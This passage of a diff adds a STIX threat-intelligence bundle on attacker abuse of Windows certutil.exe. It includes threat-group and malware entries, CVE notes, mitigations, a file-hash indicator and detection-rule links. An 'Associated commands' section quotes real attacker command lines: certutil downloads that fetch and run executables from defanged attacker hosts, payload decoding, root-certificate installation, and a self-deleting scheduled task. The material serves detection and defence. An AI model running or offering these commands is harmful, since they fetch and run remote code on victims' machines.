+          "description": "FireEye. (2014). POISON IVY: Assessing Damage and Extracting Intelligence. Retrieved November 12, 2014.",
+          "url": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-poison-ivy.pdf"
+        },
+        {
+          "source_name": "FireEye APT10 Sept 2018",
+          "description": "Matsuda, A., Muhammad I. (2018, September 13). APT10 Targeting Japanese Corporations Using Updated TTPs. Retrieved September 17, 2018.",
+          "url": "https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html"
+        },
+        {
+          "source_name": "Palo Alto menuPass Feb 2017",
+          "description": "Miller-Osborn, J. and Grunzweig, J.. (2017, February 16). menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations. Retrieved March 1, 2017.",
+          "url": "http://researchcenter.paloaltonetworks.com/2017/02/unit42-menupass-returns-new-malware-new-attacks-japanese-academics-organizations/"
+        },
+        {
+          "source_name": "PWC Cloud Hopper April 2017",
+          "description": "PwC and BAE Systems. (2017, April). Operation Cloud Hopper. Retrieved April 5, 2017.",
+          "url": "https://web.archive.org/web/20220224041316/https:/www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf"
+        },
+        {
+          "source_name": "Symantec Cicada November 2020",
+          "description": "Symantec. (2020, November 17). Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign. Retrieved December 17, 2020.",
+          "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage"
+        },
+        {
+          "source_name": "DOJ APT10 Dec 2018",
+          "description": "United States District Court Southern District of New York (USDC SDNY) . (2018, December 17). United States of America v. Zhu Hua and Zhang Shilong. Retrieved April 17, 2019.",
+          "url": "https://www.justice.gov/opa/pr/two-chinese-hackers-associated-ministry-state-security-charged-global-computer-intrusion"
+        },
+        {
+          "source_name": "District Court of NY APT10 Indictment December 2018",
+          "description": "US District Court Southern District of New York. (2018, December 17). United States v. Zhu Hua Indictment. Retrieved December 17, 2020.",
+          "url": "https://www.justice.gov/opa/page/file/1122671/download"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2023-03-29T16:53:17.235Z",
+      "name": "Threat Group-3390",
+      "description": "[Threat Group-3390](https://attack.mitre.org/groups/G0027) is a Chinese threat group that has extensively used strategic Web compromises to target victims.(Citation: Dell TG-3390) The group has been active since at least 2010 and has targeted organizations in the aerospace, government, defense, technology, energy, manufacturing and gambling/betting sectors.(Citation: SecureWorks BRONZE UNION June 2017)(Citation: Securelist LuckyMouse June 2018)(Citation: Trend Micro DRBControl February 2020)",
+      "aliases": [
+        "Threat Group-3390",
+        "Earth Smilodon",
+        "TG-3390",
+        "Emissary Panda",
+        "BRONZE UNION",
+        "APT27",
+        "Iron Tiger",
+        "LuckyMouse"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_version": "2.1",
+      "x_mitre_contributors": [
+        "Daniyal Naeem, BT Security",
+        "Kyaw Pyiyt Htet, @KyawPyiytHtet"
+      ],
+      "type": "intrusion-set",
+      "id": "intrusion-set--fb366179-766c-4a4a-afa1-52bff1fd601c",
+      "created": "2017-05-31T21:31:58.518Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G0027",
+          "external_id": "G0027"
+        },
+        {
+          "source_name": "Threat Group-3390",
+          "description": "(Citation: Dell TG-3390)(Citation: Hacker News LuckyMouse June 2018)"
+        },
+        {
+          "source_name": "TG-3390",
+          "description": "(Citation: Dell TG-3390)(Citation: Nccgroup Emissary Panda May 2018)(Citation: Hacker News LuckyMouse June 2018)"
+        },
+        {
+          "source_name": "Emissary Panda",
+          "description": "(Citation: Gallagher 2015)(Citation: Nccgroup Emissary Panda May 2018)(Citation: Securelist LuckyMouse June 2018)(Citation: Hacker News LuckyMouse June 2018)(Citation: Unit42 Emissary Panda May 2019)(Citation: Trend Micro Iron Tiger April 2021)"
+        },
+        {
+          "source_name": "Iron Tiger",
+          "description": "(Citation: Hacker News LuckyMouse June 2018)(Citation: Trend Micro Iron Tiger April 2021)"
+        },
+        {
+          "source_name": "APT27",
+          "description": "(Citation: Nccgroup Emissary Panda May 2018)(Citation: Securelist LuckyMouse June 2018)(Citation: Hacker News LuckyMouse June 2018)(Citation: Trend Micro Iron Tiger April 2021)"
+        },
+        {
+          "source_name": "LuckyMouse",
+          "description": "(Citation: Securelist LuckyMouse June 2018)(Citation: Hacker News LuckyMouse June 2018)(Citation: Trend Micro Iron Tiger April 2021)"
+        },
+        {
+          "source_name": "BRONZE UNION",
+          "description": "(Citation: SecureWorks BRONZE UNION June 2017)(Citation: Nccgroup Emissary Panda May 2018)"
+        },
+        {
+          "source_name": "Earth Smilodon",
+          "description": "(Citation: Trend Micro Iron Tiger April 2021)"
+        },
+        {
+          "source_name": "SecureWorks BRONZE UNION June 2017",
+          "description": "Counter Threat Unit Research Team. (2017, June 27). BRONZE UNION Cyberespionage Persists Despite Disclosures. Retrieved July 13, 2017.",
+          "url": "https://www.secureworks.com/research/bronze-union"
+        },
+        {
+          "source_name": "Dell TG-3390",
+          "description": "Dell SecureWorks Counter Threat Unit Threat Intelligence. (2015, August 5). Threat Group-3390 Targets Organizations for Cyberespionage. Retrieved August 18, 2018.",
+          "url": "https://www.secureworks.com/research/threat-group-3390-targets-organizations-for-cyberespionage"
+        },
+        {
+          "source_name": "Unit42 Emissary Panda May 2019",
+          "description": "Falcone, R. and Lancaster, T. (2019, May 28). Emissary Panda Attacks Middle East Government Sharepoint Servers. Retrieved July 9, 2019.",
+          "url": "https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/"
+        },
+        {
+          "source_name": "Gallagher 2015",
+          "description": "Gallagher, S.. (2015, August 5). Newly discovered Chinese hacking group hacked 100+ websites to use as “watering holes”. Retrieved January 25, 2016.",
+          "url": "http://arstechnica.com/security/2015/08/newly-discovered-chinese-hacking-group-hacked-100-websites-to-use-as-watering-holes/"
+        },
+        {
+          "source_name": "Hacker News LuckyMouse June 2018",
+          "description": "Khandelwal, S. (2018, June 14). Chinese Hackers Carried Out Country-Level Watering Hole Attack. Retrieved August 18, 2018.",
+          "url": "https://thehackernews.com/2018/06/chinese-watering-hole-attack.html"
+        },
+        {
+          "source_name": "Securelist LuckyMouse June 2018",
+          "description": "Legezo, D. (2018, June 13). LuckyMouse hits national data center to organize country-level waterholing campaign. Retrieved August 18, 2018.",
+          "url": "https://securelist.com/luckymouse-hits-national-data-center/86083/"
+        },
+        {
+          "source_name": "Trend Micro Iron Tiger April 2021",
+          "description": "Lunghi, D. and Lu, K. (2021, April 9). Iron Tiger APT Updates Toolkit With Evolved SysUpdate Malware. Retrieved November 12, 2021.",
+          "url": "https://www.trendmicro.com/en_us/research/21/d/iron-tiger-apt-updates-toolkit-with-evolved-sysupdate-malware-va.html"
+        },
+        {
+          "source_name": "Trend Micro DRBControl February 2020",
+          "description": "Lunghi, D. et al. (2020, February). Uncovering DRBControl. Retrieved November 12, 2021.",
+          "url": "https://documents.trendmicro.com/assets/white_papers/wp-uncovering-DRBcontrol.pdf"
+        },
+        {
+          "source_name": "Nccgroup Emissary Panda May 2018",
+          "description": "Pantazopoulos, N., Henry T. (2018, May 18). Emissary Panda – A potential new malicious tool. Retrieved June 25, 2018.",
+          "url": "https://research.nccgroup.com/2018/05/18/emissary-panda-a-potential-new-malicious-tool/"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "name": "CVE-2022-21894",
+      "description": "certutil has been used to exploit CVE-2022-21894. This vulnerability was patched by Microsoft in January 2022 but the affected signed binaries have not been added to the UEFI revocation list yet1. The malware uses CVE-2022-21894 (also known as Baton Drop) to bypass Windows Secure Boot and subsequently deploy malicious files to the EFI System Partition (ESP) that are launched by the UEFI firmware.",
+      "id": "vulnerability--3d7334b9-c412-48be-a0c4-c41ca7d2b12a",
+      "type": "vulnerability",
+      "spec_version": 2.1,
+      "created": "2023-08-20T18:02:03+01:00",
+      "modified": "2023-08-20T18:02:03+01:00"
+    },
+    {
+      "name": "CVE-2022-41040",
+      "description": "certutil has been used to exploit ProxyNotShell: CVE-2022-41040 and CVE-2022-41082, Microsoft Exchange Zero-Day",
+      "id": "vulnerability--e0a08ef5-7db4-40d0-961f-3f52d27fe2e5",
+      "type": "vulnerability",
+      "spec_version": 2.1,
+      "created": "2023-08-20T18:02:03+01:00",
+      "modified": "2023-08-20T18:02:03+01:00"
+    },
+    {
+      "name": "+Mitigations",
+      "description": "- Implement security measures that prevent or detect the use of Certutil for malicious purposes.\n\n\n  - Application Whitelisting: Maintain a whitelist of approved applications and prevent the execution of unauthorized tools.,\n\n\n   - EDR: Deploy EDR solutions that monitor endpoint activities in real-time.\n\n\n   - Network Monitoring: Employ network monitoring tools to detect unusual data transfers or communication patterns that might indicate the use of certutil for malicious purposes.\n\n\n    - Least Privilege: Limit user privileges to only what is necessary for their roles. This can reduce the potential impact of an attacker leveraging legitimate tools.\n\n\n    - T1560.001:M1047:Audit: System scans can be performed to identify unauthorized archival utilities. \n\n\n    - T1105:M1031:Network Intrusion Prevention: Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level.\n\n\n    - T1553.004:M1028:Operating System Configuration Windows Group Policy can be used to manage root certificates and the Flags value of HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\SystemCertificate\\\\Root\\\\ProtectedRoots can be set to 1 to prevent non-administrator users from making further root installations into their own HKCU certificate store.\n",
+      "id": "course-of-action--9ce01a7f-10b4-4d82-a636-4201d020bba7",
+      "type": "course-of-action",
+      "spec_version": 2.1,
+      "created": "2023-08-20T18:02:03+01:00",
+      "modified": "2023-08-20T18:02:03+01:00"
+    },
+    {
+      "name": "09A8A29BAA3A451713FD3D07943B4A43",
+      "description": "Original Filename: CertUtil.exe.mui \nProduct Name: Microsoft Windows Operating System\nCompany Name: Microsoft Corporation\nFile Version: 6.3.9600.16384 (winblue_rtm.130821-1623)\nProduct Version: 6.3.9600.16384\nLanguage: English (United States)\nLegal Copyright: Microsoft Corporation. All rights reserved.\nSSDEEP : 24576:ybmY2A9/m64I/DSFYNUIMizVnDJ0hf1z8fU7lz+3jKExi:yyLAQ2DS0UINRsN4SIjli",
+      "pattern": "[file:hashes.'SHA-256' = 'e2a5fb1ca722474b76d6da5c5b1d438a1e58beca52864862555c9ab1b533e72d']",
+      "id": "indicator--36b54f35-c81d-4ad5-873a-030908afc310",
+      "type": "indicator",
+      "spec_version": 2.1,
+      "created": "2023-08-20T18:02:03+01:00",
+      "modified": "2023-08-20T18:02:03+01:00",
+      "pattern_type": "stix",
+      "valid_from": "2017-06-02T18:02:03+01:00",
+      "valid_until": "2023-08-20T18:02:03+01:00",
+      "sample_refs": [
+        "file--95397801-e7e4-498e-9bc4-bff59bf3f1bc"
+      ]
+    },
+    {
+      "name": "Detections(Sigma|Sysmon|windowsEventId|Splunk|ELK)",
+      "description": "\"detections\": [\n    {\n      \"eventsid\": [\n        {\n          \"sysmon\": [\n            \"T1560.001:process:process_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:1\",\n\n\n            \"T1560.001:file:file_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:11\",\n\n\n            \"T1140:file:file_modification:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:2\",\n\n\n            \"T1105:network_traffic:network_connection_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:3\",\n\n\n            \"T1553.004:windows_registry:windows_registry_key_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:12\"\n          ],\n\n\n          \"windows\": [\n            \"T1560.001:process:process_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4688\",\n\n\n            \"T1560.001:command:command_execution:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4103\",\n\n\n            \"T1140:file:file_modification:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4670\",\n\n\n            \"T1140:script:script_execution:log_channel:Microsoft-Windows-PowerShell/Operational:log_provider:Microsoft-Windows-PowerShell:4104\",\n\n\n            \"T1105:network_traffic:network_connection_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:5156\",\n\n\n            \"T1105:network_traffic:network_connection_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:5157\",\n\n\n            \"T1105:windows_registry:windows_registry_key_modification:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4657\"\n          ]\n        }\n      ],\n\n\n      \"sigma_rules\": [\n        \"https://raw.githubusercontent.com/SigmaHQ/sigma/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_certutil_certificate_installation.yml\",\n\n\n        \"https://raw.githubusercontent.com/SigmaHQ/sigma/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_certutil_decode.yml\",\n\n\n        \"https://raw.githubusercontent.com/SigmaHQ/sigma/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_certutil_download.yml\",\n\n\n        \"https://raw.githubusercontent.com/SigmaHQ/sigma/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_certutil_encode.yml\",\n\n\n        \"https://raw.githubusercontent.com/SigmaHQ/sigma/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_certutil_export_pfx.yml\"\n      ],\n\n\n      \"other_rules\": [\n        \"https://raw.githubusercontent.com/splunk/security_content/develop/dev_ssa/endpoint/ssa___windows_certutil_decode_file.yml\",\n\n\n        \"https://raw.githubusercontent.com/splunk/security_content/develop/dev/endpoint/certutil_download_with_urlcache_and_split_arguments.yml\",\n\n\n        \"https://raw.githubusercontent.com/splunk/security_content/develop/detections/endpoint/certutil_exe_certificate_extraction.yml\",\n\n\n        \"https://raw.githubusercontent.com/elastic/detection-rules/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/command_and_control_certutil_network_connection.toml\"\n      ]\n    }\n  ]",
+      "id": "course-of-action--39ac0090-f642-4cf4-8862-5ac0ba525f60",
+      "type": "course-of-action",
+      "spec_version": 2.1,
+      "created": "2023-08-20T18:02:03+01:00",
+      "modified": "2023-08-20T18:02:03+01:00",
+      "external_references": [
+        {
+          "source_name": "OSSEM-DM",
+          "url": "https://github.com/OTRF/OSSEM-DM/blob/03404288803c743cd5254f8888d664a5a106ec89/use-cases/mitre_attack/techniques_to_events_mapping.yaml"
+        }
+      ]
+    },
+    {
+      "name": "Associated commands",
+      "description": "The associated certutil commands that has been used by the threat actors:  \n\n\"associated_commands\": [\n        \"certutil  -urlcache -split -f http://91.208.184[.]78/2.exe\",\n\n\n        \"certutil.exe -decode 1.txt l.exe\",\n\n\n        \"certutil -addstore -f -user ROOT ProgramData\\\\cert512121.der\",\n\n\n        \"C:\\\\Windows\\\\System32\\\\cmd.exe /k certutil -urlcache -split -f hxxp://220.158.216[.]127/MScertificate.exe & MScertificate.exe\",\n\n\n        \"cmd /c certutil.exe -urlcache -split -f http:\\\\\\\\dlj40s.jdanief[.]xyz/images/1.pdf C:\\\\ProgramData\\\\1.pdf&start\",\n\n\n        \"C:\\\\ProgramData\\\\1.pdf /c certutil.exe -urlcache -split -f http:\\\\\\\\dlj40s.jdanief[.]xyz/images/1.pdf C:\\\\ProgramData\\\\1.pdf&start C:\\\\ProgramData\\\\1.pdf\",\n\n\n        \"SchTasks /Create /SC MINUTE /MO 2 /TN \\\"LocalReportHealth\\\" /TR \\\"cmd.exe /c certutil -decode %localappdata%\\\\srvBS.txt %localappdata%\\\\srvHealth.exe && schtasks /DELETE /tn LocalReportHealth /f && del %localappdata%\\\\srvBS.txt\\\"\",\n\n\n        \"C:\\\\Windows\\\\System32\\\\cmd.exe /c certutil -decode C:\\\\ProgramData\\\\padre1.txt C:\\\\ProgramData\\\\GUP.txt\",\n\n\n        \"cd %temp% && certutil -urlcache -split -f http://0[.]18.154/debug.exe &&debug.exe\"\n      ],\n\n\n      \"pre_and_next_related_cmd\": [\n        {\n          \"pre_cmd_event\": [\n            \"msiexec /q /i\",\n\n\n            \"wscript *\\\\Microsoft\\\\microsoft.vbs\",\n\n\n            \"/m file.lnk /c cmd /c echo f|xcopy\",\n\n\n            \"SchTasks /Create /SC\",\n\n\n            \"wmic process call create cmd.exe /c\"\n          ],\n\n\n          \"next_cmd_event\": [\n            \"cmd.exe /c reg add\",\n\n\n            \"Service.exe Add /freg add\",\n\n\n            \"SchTasks /Create /SC\",\n\n\n            \"C:\\\\Windows\\\\System32\\\\esentutl.exe /y C:\\\\ProgramData\\\\GUP.txt /d C:\\\\ProgramData\\\\GUP.exe /o\",\n\n\n            \"wmic process call create cmd.exe /c\"\n          ]\n        }\n      ]\n    }\n  ]",
+      "id": "sighting--ae77c806-10ee-4c99-8d40-a823fe89e270",
+      "type": "sighting",
+      "spec_version": 2.1,
+      "created": "2023-08-20T18:02:03+01:00",
+      "modified": "2023-08-20T18:02:03+01:00",
+      "sighting_of_ref": [
+        "tool--0a68f1f1-da74-4d28-8d9a-696c082706cc"
+      ]
+    },
+    {
+      "description": " Certutil has been used to exploit CVE-2022-21894 and CVE-2022-41040",
+      "id": "sighting--20b834ae-9bb5-429e-b17a-c952220b370f",
+      "type": "sighting",
+      "spec_version": 2.1,
+      "created": "2023-08-20T18:02:03+01:00",
+      "modified": "2023-08-20T18:02:03+01:00",
+      "external_references": [
+        {
+          "source_name": "microsoft",
+          "url": "https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/"
+        },
+        {
+          "source_name": "socprime",
+          "url": "https://socprime.com/blog/cve-2022-41040-and-cve-2022-41082-detection-novel-microsoft-exchange-zero-day-vulnerabilities-actively-exploited-in-the-wild/"
+        }
+      ],
+      "sighting_of_ref": [
+        "tool--0a68f1f1-da74-4d28-8d9a-696c082706cc",
+        "vulnerability--e0a08ef5-7db4-40d0-961f-3f52d27fe2e5",
+        "vulnerability--3d7334b9-c412-48be-a0c4-c41ca7d2b12a"
+      ]
+    },
+    {
+      "name": "Certutil.exe",
+      "type": "file",
+      "id": "file--95397801-e7e4-498e-9bc4-bff59bf3f1bc",
+      "spec_version": "2.1",
+      "parent_directory_ref": [
+        "directory--a72dd358-41ba-47dd-a84c-e5d5c7472c7e",
+        "directory--c90ee729-2123-4a08-95c3-facc69598bef"
+      ]
+    },
+    {
+      "path": "c:\\windows\\system32\\certutil.exe",
+      "type": "directory",
+      "spec_version": "2.1",
+      "id": "directory--a72dd358-41ba-47dd-a84c-e5d5c7472c7e"
+    },
+    {
+      "path": "c:\\windows\\syswow64\\certutil.exe",
+      "type": "directory",
+      "spec_version": "2.1",
+      "id": "directory--c90ee729-2123-4a08-95c3-facc69598bef"
+    },
+    {
+      "type": "observed-data",
+      "spec_version": "2.1",
+      "id": "observed-data--b4cf82b9-f6eb-4fe9-993b-755a78e9168c",
+      "created": "2023-08-20T18:02:03+01:00",
+      "modified": "2023-08-20T18:02:03+01:00",
+      "first_observed": "2017-06-02T19:00:00Z",
+      "last_observed": "2023-08-20T18:02:03+01:00",
+      "number_observed": 12,
+      "object_refs": [
+        "file--95397801-e7e4-498e-9bc4-bff59bf3f1bc"
+      ]
+    },
+    {
+      "name": "Associated APTs",
+      "description": "APTs been observed using LOLBin tool Certutil.exe",
+      "type": "grouping",
+      "spec_version": "2.1",
+      "id": "grouping-29aba8dd-09af-4848-8366-f575d26ff356",
+      "created": "2023-08-20T17:34:58.798Z",
+      "modified": "2023-08-20T17:34:58.798Z",
+      "context": "suspicious-activity",
+      "object_refs": [
+        "intrusion-set--bef4c620-0787-42a8-a96d-b7eb6e85917c",
+        "intrusion-set--18854f55-ac7c-4634-bd9a-352dd07613b7",
+        "intrusion-set--f40eb8ce-2a74-4e56-89a1-227021410142",
+        "intrusion-set--7a19ecb1-3c65-4de3-a230-993516aed6a6",
+        "intrusion-set--cc613a49-9bfa-4e22-98d1-15ffbb03f034",
+        "intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d",
+        "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
+        "intrusion-set--222fbd21-fc4f-4b7e-9f85-0e6e3a76c33f",
+        "intrusion-set--fb366179-766c-4a4a-afa1-52bff1fd601c"
+      ]
+    },
+    {
+      "source_ref": "grouping-29aba8dd-09af-4848-8366-f575d26ff356",
+      "target_ref": "tool--0a68f1f1-da74-4d28-8d9a-696c082706cc",
+      "relationship_type": "uses",
+      "type": "relationship",
+      "created": "2023-08-20T17:34:58.798Z",
+      "modified": "2023-08-20T17:34:58.798Z",
+      "id": "relationship--b602385b-71ae-490f-9fb5-116ab302342e",
+      "targetObjectType": "grouping"
+    },
+    {
+      "name": "Associated TTPs",
+      "description": "TTPs been used by LOLBin tool Certutil.exe",
+      "type": "grouping",
+      "spec_version": "2.1",
+      "id": "grouping-dfc93fde-f428-4cb4-83d3-215fda509b36",
+      "created": "2023-08-20T17:34:58.798Z",
+      "modified": "2023-08-20T17:34:58.798Z",
+      "context": "suspicious-activity",
+      "object_refs": [
+        "attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662",
+        "attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c",
+        "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add",
+        "attack-pattern--c615231b-f253-4f58-9d47-d5b4cbdb6839"
+      ]
+    },
+    {
+      "source_ref": "grouping-dfc93fde-f428-4cb4-83d3-215fda509b36",
+      "target_ref": "tool--0a68f1f1-da74-4d28-8d9a-696c082706cc",
+      "relationship_type": "uses",
+      "type": "relationship",
+      "created": "2023-08-20T18:53:57.511Z",
+      "modified": "2023-08-20T18:53:57.511Z",
+      "id": "relationship--b54a7a6b-f330-4c72-bad5-a4e167013d33",
+      "targetObjectType": "grouping"
+    },
+    {
+      "source_ref": "indicator--36b54f35-c81d-4ad5-873a-030908afc310",
+      "target_ref": "tool--0a68f1f1-da74-4d28-8d9a-696c082706cc",
+      "relationship_type": "indicates",
+      "type": "relationship",
+      "created": "2023-08-20T18:53:57.511Z",
+      "modified": "2023-08-20T18:53:57.511Z",
+      "id": "relationship--5eb9f430-8828-40c0-9d58-ec566e749ae4",
+      "targetObjectType": "tool"
+    },
+    {
+      "source_ref": "indicator--36b54f35-c81d-4ad5-873a-030908afc310",
+      "target_ref": "observed-data--b4cf82b9-f6eb-4fe9-993b-755a78e9168c",
+      "relationship_type": "based-on",
+      "type": "relationship",
+      "created": "2023-08-20T19:59:49.268Z",
+      "modified": "2023-08-20T19:59:49.268Z",
+      "id": "relationship--af8f7085-23a6-4f40-a813-aef08285a240",
+      "targetObjectType": "indicator"
+    },
+    {
+      "name": "Associated Malware",
+      "description": "Malware been observed using LOLBin tool Certutil.exe",
+      "type": "grouping",
+      "spec_version": "2.1",
+      "id": "grouping-9a517244-4139-49d7-b2f4-fab8251fac74",
+      "created": "2023-08-20T17:34:58.798Z",
+      "modified": "2023-08-20T17:34:58.798Z",
+      "context": "suspicious-activity",
+      "object_refs": [
+        "malware--edb24a93-1f7a-4bbf-a738-1397a14662c6",
+        "malware--071d5d65-83ec-4a55-acfa-be7d5f28ba9a",
+        "malware--5be33fef-39c0-4532-84ee-bea31e1b5324",
+        "malware--54a73038-1937-4d71-a253-316e76d5413c",
+        "malware--754effde-613c-4244-a83e-fb659b2a4d06"
+
+      ]
+    },
+    {
+      "source_ref": "grouping-9a517244-4139-49d7-b2f4-fab8251fac74",
+      "target_ref": "tool--0a68f1f1-da74-4d28-8d9a-696c082706cc",
+      "relationship_type": "uses",
+      "type": "relationship",
+      "created": "2023-08-20T18:53:57.511Z",
+      "modified": "2023-08-20T18:53:57.511Z",
+      "id": "relationship--fa0d37b1-d651-43d5-81d5-8d66fb3f822b",
+      "targetObjectType": "grouping"
+    },
+    {
+      "modified": "2023-03-22T05:03:29.436Z",
+      "name": "Netwalker",
+      "description": "[Netwalker](https://attack.mitre.org/software/S0457) is fileless ransomware written in PowerShell and executed directly in memory.(Citation: TrendMicro Netwalker May 2020)",
+      "x_mitre_platforms": [
+        "Windows"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_version": "1.1",
+      "x_mitre_aliases": [
+        "Netwalker"
+      ],
+      "type": "malware",
+      "id": "malware--754effde-613c-4244-a83e-fb659b2a4d06",
+      "created": "2020-05-26T21:02:38.186Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/software/S0457",
+          "external_id": "S0457"
+        },
+        {
+          "source_name": "TrendMicro Netwalker May 2020",
+          "description": "Victor, K.. (2020, May 18). Netwalker Fileless Ransomware Injected via Reflective Loading . Retrieved May 26, 2020.",
+          "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/netwalker-fileless-ransomware-injected-via-reflective-loading/"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "labels": [
+        "malware"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2021-10-01T20:33:55.926Z",
+      "name": "Lucifer",
+      "description": "[Lucifer](https://attack.mitre.org/software/S0532) is a crypto miner and DDoS hybrid malware that leverages well-known exploits to spread laterally on Windows platforms.(Citation: Unit 42 Lucifer June 2020)",
+      "labels": [
+        "malware"
+      ],
+      "x_mitre_platforms": [
+        "Windows"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_contributors": [
+        "Daniyal Naeem, BT Security"
+      ],
+      "x_mitre_aliases": [
+        "Lucifer"
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "id": "malware--54a73038-1937-4d71-a253-316e76d5413c",
+      "type": "malware",
+      "created": "2020-11-16T18:40:34.473Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "external_references": [
+        {
+          "external_id": "S0532",
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/software/S0532"
+        },
+        {
+          "source_name": "Unit 42 Lucifer June 2020",
+          "url": "https://unit42.paloaltonetworks.com/lucifer-new-cryptojacking-and-ddos-hybrid-malware/",
+          "description": "Hsu, K. et al. (2020, June 24). Lucifer: New Cryptojacking and DDoS Hybrid Malware Exploiting High and Critical Vulnerabilities to Infect Windows Devices. Retrieved November 16, 2020."
+        }
+      ],
+      "x_mitre_version": "1.1",
+      "x_mitre_attack_spec_version": "2.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2020-03-31T12:38:41.115Z",
+      "name": "ISMInjector",
+      "description": "[ISMInjector](https://attack.mitre.org/software/S0189) is a Trojan used to install another [OilRig](https://attack.mitre.org/groups/G0049) backdoor, ISMAgent. (Citation: OilRig New Delivery Oct 2017)",
+      "labels": [
+        "malware"
+      ],
+      "x_mitre_platforms": [
+        "Windows"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_contributors": [
+        "Robert Falcone"
+      ],
+      "x_mitre_aliases": [
+        "ISMInjector"
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "id": "malware--5be33fef-39c0-4532-84ee-bea31e1b5324",
+      "type": "malware",
+      "created": "2018-01-16T16:13:52.465Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/software/S0189",
+          "external_id": "S0189"
+        },
+        {
+          "source_name": "ISMInjector",
+          "description": "(Citation: OilRig New Delivery Oct 2017)"
+        },
+        {
+          "source_name": "OilRig New Delivery Oct 2017",
+          "description": "Falcone, R. and Lee, B. (2017, October 9). OilRig Group Steps Up Attacks with New Delivery Documents and New Injector Trojan. Retrieved January 8, 2018.",
+          "url": "https://researchcenter.paloaltonetworks.com/2017/10/unit42-oilrig-group-steps-attacks-new-delivery-documents-new-injector-trojan/"
+        }
+      ],
+      "x_mitre_version": "1.1",
+      "x_mitre_attack_spec_version": "2.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2020-03-18T15:22:32.747Z",
+      "name": "NOKKI",
